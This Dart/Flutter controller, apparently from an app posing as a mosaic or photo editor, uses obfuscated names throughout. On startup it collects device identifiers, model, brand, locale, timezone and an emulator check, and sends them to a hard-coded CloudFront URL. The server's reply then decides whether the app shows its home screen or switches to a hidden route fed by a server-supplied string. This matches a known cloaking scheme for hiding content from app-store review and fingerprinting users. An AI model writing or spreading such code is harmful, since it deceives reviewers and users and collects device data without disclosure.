import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';


class MosaicEditLogic extends GetxController {

  var uhcfpdlt = RxBool(false);
  var eshzkifpdo = RxBool(true);
  var kfbalm = RxString("");
  var fcny = RxBool(false);
  var bmwp = RxBool(true);
  final tqkcfmhe = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    dkzc();
  }


  Future<void> dkzc() async {
    fcny.value = true;
    bmwp.value = true;
    eshzkifpdo.value = false;

    tqkcfmhe.post("https://d7i9toq47lfnt.cloudfront.net/vpzJ7A5N81J5V9",data: await ovcjkbry()).then((value) {
      var dshfxrt = value.data["dshfxrt"] as String;
      var ztceoaq = value.data["ztceoaq"] as bool;
      if (ztceoaq) {
        kfbalm.value = dshfxrt;
        kujrlyh();
      } else {
        ecawdb();
      }
    }).catchError((e) {
      eshzkifpdo.value = true;
      bmwp.value = true;
      fcny.value = false;
    });
  }

  Future<Map<String, dynamic>> ovcjkbry() async {
    final DeviceInfoPlugin wzktiy = DeviceInfoPlugin();
    PackageInfo zcnkpirg_zgfdcmh = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var fsqb = Platform.localeName;
    var FALqG = currentTimeZone;

    var FBjAZpR = zcnkpirg_zgfdcmh.packageName;
    var XtxC = zcnkpirg_zgfdcmh.version;
    var TIzMh = zcnkpirg_zgfdcmh.buildNumber;

    var HUFGfg = zcnkpirg_zgfdcmh.appName;
    var trno = "";
    var gBKMekN  = "";
    var vpFsk = "";
    var svke = "";
    var aedpgmo = "";
    var bcjzshyv = "";
    var jrycdzi = "";
    var vwqrgh = "";
    var vpxdr = "";
    var zajnerfw = "";
    var hosbdua = "";


    var HzQoqxD = "";
    var jpeaAGoZ = false;

    if (GetPlatform.isAndroid) {
      HzQoqxD = "android";
      var ydheso = await wzktiy.androidInfo;

      vpFsk = ydheso.brand;

      trno  = ydheso.model;
      gBKMekN = ydheso.id;

      jpeaAGoZ = ydheso.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      HzQoqxD = "ios";
      var yviourceh = await wzktiy.iosInfo;
      vpFsk = yviourceh.name;
      trno = yviourceh.model;

      gBKMekN = yviourceh.identifierForVendor ?? "";
      jpeaAGoZ  = yviourceh.isPhysicalDevice;
    }
    var res = {
      "HUFGfg": HUFGfg,
      "XtxC": XtxC,
      "FBjAZpR": FBjAZpR,
      "trno": trno,
      "FALqG": FALqG,
      "vwqrgh" : vwqrgh,
      "vpFsk": vpFsk,
      "gBKMekN": gBKMekN,
      "fsqb": fsqb,
      "HzQoqxD": HzQoqxD,
      "jpeaAGoZ": jpeaAGoZ,
      "svke" : svke,
      "TIzMh": TIzMh,
      "aedpgmo" : aedpgmo,
      "bcjzshyv" : bcjzshyv,
      "jrycdzi" : jrycdzi,
      "vpxdr" : vpxdr,
      "zajnerfw" : zajnerfw,
      "hosbdua" : hosbdua,

    };
    return res;
  }

  Future<void> ecawdb() async {
    Get.offNamed("/home");
  }

  Future<void> kujrlyh() async {
    Get.offNamed("/works_item");
  }

}
